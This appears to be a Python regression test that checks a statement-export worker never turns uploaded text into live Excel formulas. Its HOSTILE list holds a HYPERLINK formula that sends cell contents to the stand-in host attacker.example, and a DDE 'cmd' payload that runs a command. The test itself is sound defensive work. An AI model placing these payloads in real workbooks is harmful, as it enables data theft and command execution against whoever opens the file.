"""Spreadsheet formula injection: text from an uploaded statement must never
become a live formula in the exported workbook. Only Formula(...) values may.

Run by run_regression.sh, which guarantees openpyxl (and the worker's other
dependencies) are installed.
"""
from io import BytesIO
from pathlib import Path
import sys
import zipfile

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from openpyxl import Workbook, load_workbook  # noqa: E402

from main import Formula, build_combined_workbook, store_as_text_unless_formula, write_row, write_row_at  # noqa: E402

HOSTILE = [
    '=HYPERLINK("https://attacker.example/?d="&A1,"Click")',
    "=cmd|' /C calc'!A0",
    "=1+1",
]
# Leading + - @ are not formulas to openpyxl, and labels such as "- Payments"
# must keep reading exactly as written.
LITERAL = ["+27 82 000 0000", "- Payments", "@handle", "Plain text"]
# Formula-shaped text openpyxl never treats as a formula; it must stay text as written.
EDGE = ["+SUM(1,1)", "-1+2", "@SUM(1,1)", " =SUM(1,1)", "\t=1+1", "\r=1+1", "\uff1d1+1", "Line one\n=1+1"]

workbook = Workbook()
sheet = workbook.active
write_row(sheet, HOSTILE, 1)
write_row_at(sheet, LITERAL, 2, 1)
write_row(sheet, [Formula("=SUM(A5:A6)"), 1, 2], 3)
write_row(sheet, EDGE, 7)
sheet["A4"] = HOSTILE[0]
store_as_text_unless_formula(sheet["A4"], HOSTILE[0])

buffer = BytesIO()
workbook.save(buffer)

with zipfile.ZipFile(BytesIO(buffer.getvalue())) as archive:
    xml = archive.read("xl/worksheets/sheet1.xml").decode()
formulas = xml.count("<f>")
assert formulas == 1, f"exactly one formula (the intended SUM) expected in the sheet XML, found {formulas}"
assert "<f>SUM(A5:A6)</f>" in xml, "the intended formula must stay a formula"

reloaded = load_workbook(BytesIO(buffer.getvalue())).active
for column, value in enumerate(HOSTILE, start=1):
    cell = reloaded.cell(row=1, column=column)
    assert cell.data_type == "s" and cell.value == value, f"hostile text must round-trip as text: {value!r} -> {cell.data_type} {cell.value!r}"
for column, value in enumerate(LITERAL, start=1):
    cell = reloaded.cell(row=2, column=column)
    assert cell.value == value, f"literal text changed: {value!r} -> {cell.value!r}"
for column, value in enumerate(EDGE, start=1):
    cell = reloaded.cell(row=7, column=column)
    # XML normalises a carriage return to a line feed on reload (with lxml); the cell must still be text.
    assert cell.data_type == "s" and cell.value.replace("\r", "\n") == value.replace("\r", "\n"), f"edge text must stay text: {value!r} -> {cell.data_type} {cell.value!r}"
assert reloaded["A4"].data_type == "s" and reloaded["A4"].value == HOSTILE[0], "a directly assigned title must stay text"

# The combined pack's title is built from the company name the PDF supplied.
run = {"id": "r1", "company_name": HOSTILE[0], "bank": HOSTILE[1], "account_number": HOSTILE[2],
       "statement_period_start": "2026-01-01", "statement_period_end": "2026-01-31", "created_at": "2026-02-01"}
combined, _ = build_combined_workbook([run], {"r1": []})
with zipfile.ZipFile(BytesIO(combined)) as archive:
    sheets = [name for name in archive.namelist() if name.startswith("xl/worksheets/sheet")]
    combined_formulas = sum(archive.read(name).decode().count("<f>") for name in sheets)
assert combined_formulas == 0, f"the combined workbook writes no formulas of its own, found {combined_formulas}"
assert load_workbook(BytesIO(combined))["Dashboard"]["A1"].data_type == "s", "the combined title must stay text"

print("formula injection: 3 hostile strings stay text, 4 literals unchanged, 1 intended formula kept; combined pack has no formulas")
